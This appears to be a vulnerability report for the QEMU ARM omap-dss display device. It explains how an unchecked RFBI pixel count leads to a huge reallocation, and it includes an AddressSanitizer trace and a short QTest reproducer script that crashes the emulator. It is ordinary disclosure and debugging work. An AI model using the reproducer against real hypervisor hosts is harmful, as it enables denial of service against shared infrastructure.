# Out of memory in hw/omap-dss for ARM

# Out-of-memory bug in hw/omap-dss for ARM causing a DoS

## Root cause analysis

In omap-dss, g_realloc(bounce_buffer, len) can allocate a very large buffer causing the memory exhaustion.

```
static void omap_rfbi_write(void *opaque, hwaddr addr, uint64_t value, unsigned size) {
   switch (addr) {
     case 0x44:	/* RFBI_PIXELCNT */
        s->rfbi.pixels = value; // first, set pixels with any value
        break;

static void omap_rfbi_transfer_start(struct omap_dss_s *s) {
    len = s->rfbi.pixels * 2;  // second, double pixels
    if (!data) {
        if (len > bounce_len) {
            bounce_buffer = g_realloc(bounce_buffer, len);
                                          // BOOM Here
        }
```

## More details

### Hypervisor, hypervisor version, upstream commit/tag, host
qemu, 6.1.50, c52d69e7dbaaed0ffdef8125e79218672c30161d, Ubuntu 18.04

### VM architecture, device, device type
arm, omap_dss, display

### Bug Type: Out-of-Memory

### Stack traces, crash details

```
==471==ERROR: AddressSanitizer: requested allocation size 0xfffffffffffe0000 (0xfffffffffffe1000 after adjustments for alignment, red zones etc.) exceeds maximum supported size of 0x10000000000 (thread T0)
    #0 0x55a003044368 in __interceptor_realloc /root/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:164
    #1 0x7f5cf9d85c8f in g_realloc (/usr/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x51c8f)
    #2 0x55a004095907 in memory_region_write_accessor /root/qemu/build-oss-fuzz/../softmmu/memory.c:491:5
    #3 0x55a0040952ed in access_with_adjusted_size /root/qemu/build-oss-fuzz/../softmmu/memory.c:552:18
    #4 0x55a0040952ed in memory_region_dispatch_write /root/qemu/build-oss-fuzz/../softmmu/memory.c:1502:16
    #5 0x55a003f433a1 in flatview_write_continue /root/qemu/build-oss-fuzz/../softmmu/physmem.c:2746:23
    #6 0x55a003f35f37 in flatview_write /root/qemu/build-oss-fuzz/../softmmu/physmem.c:2786:14
    #7 0x55a003f356dc in address_space_write /root/qemu/build-oss-fuzz/../softmmu/physmem.c:2878:18
    #8 0x55a003fecdc9 in qtest_process_command /root/qemu/build-oss-fuzz/../softmmu/qtest.c:534:13
    #9 0x55a003fecdc9 in qtest_process_inbuf /root/qemu/build-oss-fuzz/../softmmu/qtest.c:797:9
    #10 0x55a0041d7d5b in fd_chr_read /root/qemu/build-oss-fuzz/../chardev/char-fd.c:68:9
    #11 0x7f5cf9d803a4 in g_main_context_dispatch (/usr/lib/x86_64-linux-gnu/libglib-2.0.so.0+0x4c3a4)

==471==HINT: if you don't care about these errors you may set allocator_may_return_null=1
SUMMARY: AddressSanitizer: allocation-size-too-big /root/llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp:164 in __interceptor_realloc
==471==ABORTING
```

### Reproducer steps

I use QTest to reproduce this bug.

```
#!/bin/bash -x
export QEMU=/root/qemu/build-oss-fuzz/qemu-system-arm
export BUILDROOT=./
# 0x48050800
cat << EOF | $QEMU \
-machine n810,accel=qtest -m 128M -qtest stdio -monitor none -serial none \
-display none -nodefaults -qtest stdio
writel 0x48050440 0x00000800
writel 0x48050844 0xFFFF0000
writel 0x48050840 0x00000011
EOF
```

qemu-system-arm: GLib: ../../../../glib/gmem.c:170: failed to allocate 18446744073709420544 bytes

## Contact

Let us know if I need to provide more information.
